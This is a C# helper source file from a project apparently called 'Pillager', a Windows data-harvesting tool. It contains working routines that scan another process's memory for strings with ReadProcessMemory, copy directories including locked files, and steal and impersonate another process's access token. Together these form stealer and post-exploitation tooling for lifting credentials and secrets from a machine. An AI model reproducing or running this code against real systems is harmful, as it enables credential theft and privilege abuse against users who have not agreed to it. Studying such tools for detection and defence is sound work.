using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace Pillager.Helper
{
    internal class Methods
    {
        internal static uint MEM_COMMIT = 0x1000;
        internal static uint PAGE_READONLY = 0x02;
        internal static uint PAGE_READWRITE = 0x04;
        internal static uint PAGE_EXECUTE = 0x10;
        internal static uint PAGE_EXECUTE_READ = 0x20;
        public static List<long> SearchProcess(Process process, string searchString)
        {
            List<long> addrList = new List<long>();

            if (IntPtr.Size == 8)
            {
                IntPtr minAddress = IntPtr.Zero;
                IntPtr maxAddress = new IntPtr(2147483647);

                while (minAddress.ToInt64() < maxAddress.ToInt64())
                {
                    int result;
                    Native.MEMORY_BASIC_INFORMATION64 memInfo;
                    result = Native.VirtualQueryEx64(process.Handle, minAddress, out memInfo, (uint)Marshal.SizeOf(typeof(Native.MEMORY_BASIC_INFORMATION64)));
                    if (memInfo.State == MEM_COMMIT && (memInfo.Protect == PAGE_EXECUTE || memInfo.Protect == PAGE_EXECUTE_READ || memInfo.Protect == PAGE_EXECUTE_READ || memInfo.Protect == PAGE_READWRITE || memInfo.Protect == PAGE_READONLY))
                    {
                        byte[] buffer = new byte[(long)memInfo.RegionSize];
                        bool success = Native.ReadProcessMemory(process.Handle, memInfo.BaseAddress, buffer, buffer.Length, out _);

                        if (success)
                        {
                            byte[] search = Encoding.ASCII.GetBytes(searchString);
                            for (int i = 0; i < buffer.Length - 8; i++)
                            {
                                if (buffer[i] == search[0])
                                {
                                    for (int s = 1; s < search.Length; s++)
                                    {
                                        if (buffer[i + s] != search[s])
                                            break;
                                        if (s == search.Length - 1)
                                        {
                                            addrList.Add((long)memInfo.BaseAddress + i);
                                        }
                                    }
                                }
                            }
                        }
                    }
                    minAddress = new IntPtr(memInfo.BaseAddress.ToInt64() + (long)memInfo.RegionSize);

                    if (result == 0)
                    {
                        break;
                    }


                }
            }
            else
            {
                long minAddress = 0;
                long maxAddress = 2147483647;

                while (minAddress < maxAddress)
                {
                    Native.MEMORY_BASIC_INFORMATION32 memInfo;
                    int result = Native.VirtualQueryEx32(process.Handle, (IntPtr)minAddress, out memInfo, (uint)Marshal.SizeOf(typeof(Native.MEMORY_BASIC_INFORMATION32)));

                    if (result == 0)
                    {
                        break;
                    }

                    if (memInfo.State == MEM_COMMIT && (memInfo.Protect == PAGE_EXECUTE || memInfo.Protect == PAGE_EXECUTE_READ || memInfo.Protect == PAGE_EXECUTE_READ || memInfo.Protect == PAGE_READWRITE || memInfo.Protect == PAGE_READONLY))
                    {
                        byte[] buffer = new byte[memInfo.RegionSize];
                        bool success = Native.ReadProcessMemory(process.Handle, (IntPtr)memInfo.BaseAddress, buffer, buffer.Length, out _);

                        if (success)
                        {
                            byte[] search = Encoding.ASCII.GetBytes(searchString);
                            for (int i = 0; i < buffer.Length - 8; i++)
                            {
                                if (buffer[i] == search[0])
                                {
                                    for (int s = 1; s < search.Length; s++)
                                    {
                                        if (buffer[i + s] != search[s])
                                            break;
                                        if (s == search.Length - 1)
                                        {
                                            addrList.Add(memInfo.BaseAddress + i);
                                        }
                                    }
                                }
                            }
                        }
                    }
                    minAddress = (uint)(memInfo.BaseAddress + memInfo.RegionSize);
                }
            }

            return addrList;
        }

        public static void CopyDirectory(string sourceDir, string destinationDir, bool recursive)
        {
            var dir = new DirectoryInfo(sourceDir);

            if (!dir.Exists)
                return;

            DirectoryInfo[] dirs = dir.GetDirectories();
            Directory.CreateDirectory(destinationDir);
            foreach (FileInfo file in dir.GetFiles())
            {
                string targetFilePath = Path.Combine(destinationDir, file.Name);
                try
                {
                    File.Copy(file.FullName, targetFilePath, true );
                }
                catch
                {
                    byte[] filebytes = LockedFile.ReadLockedFile(file.FullName);
                    if (filebytes != null)
                    {
                        File.WriteAllBytes(targetFilePath, filebytes);
                    }
                }
            }

            if (recursive)
            {
                foreach (DirectoryInfo subDir in dirs)
                {
                    string newDestinationDir = Path.Combine(destinationDir, subDir.Name);
                    CopyDirectory(subDir.FullName, newDestinationDir, true);
                }
            }
        }

        public static string GetProcessUserName(Process process)
        {
            var processHandle = IntPtr.Zero;
            try
            {
                Native.OpenProcessToken(process.Handle, 8, out processHandle);
                var wi = new WindowsIdentity(processHandle);
                return wi.Name;
            }
            catch
            {
                return "";
            }
            finally
            {
                if (processHandle != IntPtr.Zero) Native.CloseHandle(processHandle);
            }
        }

        public static bool ImpersonateProcessToken(int pid)
        {
            IntPtr hProcess = Native.OpenProcess(Native.PROCESS_ACCESS_FLAGS.PROCESS_QUERY_INFORMATION, true, pid);
            if (hProcess == IntPtr.Zero) return false;
            IntPtr hToken;
            if (!Native.OpenProcessToken(hProcess, 0x00000002 | 0x00000004, out hToken)) return false;
            IntPtr DuplicatedToken = new IntPtr();
            if (!Native.DuplicateToken(hToken, 2, ref DuplicatedToken)) return false;
            if (!Native.SetThreadToken(IntPtr.Zero, DuplicatedToken)) return false;
            return true;
        }
    }
}
